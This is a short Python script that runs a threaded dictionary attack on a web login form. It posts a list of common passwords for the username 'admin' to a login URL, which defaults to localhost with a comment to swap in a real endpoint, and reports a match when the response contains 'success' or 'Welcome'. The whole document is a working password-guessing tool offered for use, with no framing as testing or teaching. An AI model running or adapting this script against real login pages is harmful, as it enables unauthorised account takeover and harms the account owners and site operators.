import requests
import threading

url = "http://localhost:5000/login"  # Change this to your actual login endpoint
username = "admin"
passwords = ["123456", "password", "qwerty", "letmein", "admin123", "welcome", "iloveyou", "root", "passw0rd"]

def try_password(password):
    data = {"username": username, "password": password}
    response = requests.post(url, data=data)

    if "success" in response.text or "Welcome" in response.text:
        print(f"✅ Password Found: {password}")
        exit()

threads = []
for password in passwords:
    t = threading.Thread(target=try_password, args=(password,))
    threads.append(t)
    t.start()

for t in threads:
    t.join()
